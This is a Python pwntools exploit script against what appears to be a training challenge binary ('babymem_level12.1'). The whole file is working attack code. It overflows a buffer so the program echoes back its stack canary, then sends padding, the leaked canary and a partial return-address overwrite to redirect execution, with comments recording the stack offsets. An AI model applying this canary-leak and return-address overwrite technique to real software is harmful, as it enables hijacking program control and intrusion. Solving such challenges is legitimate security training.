from pwn import *
context.terminal = "bash"
p = process("/challenge/babymem_level12.1")
print(p.recvuntil(b"size:"))
p.sendline(b'100')
print(p.recvuntil(b"bytes)!"))
win = b"A"*63
win += b"R"
win += b"E"
win += b"P"
win += b"E"
win += b"A"
win += b"T"
win += b"A"*3
sys.stdout.flush()
p.sendline(win)
#---------------------------------------------------
print(p.recvuntil(b"said:"))
print(p.recvline())
canary = p.recvline()
print("HEEEEEEEEEEEEEEEEEEY AM HERE ->  ",canary)
print(p.recvuntil(b"size:"))
p.sendline(b'100')
win = b"A"*72
win += b'\x00'+canary
win += b"A"
#1fbc
win += b'\xbc\x1f'
print(win)
#p.sendline(b'\x00') #appending 0a
p.send(win)
#win = b"A"*8

for j in range(100):
    print(j , " ",p.recvline())



#-------------------------
#ret - 0x7ffce60dbbd8
#buff - 0x7ffce60dbb80
#diff - 88
#buff size = 88 - 16 = 72
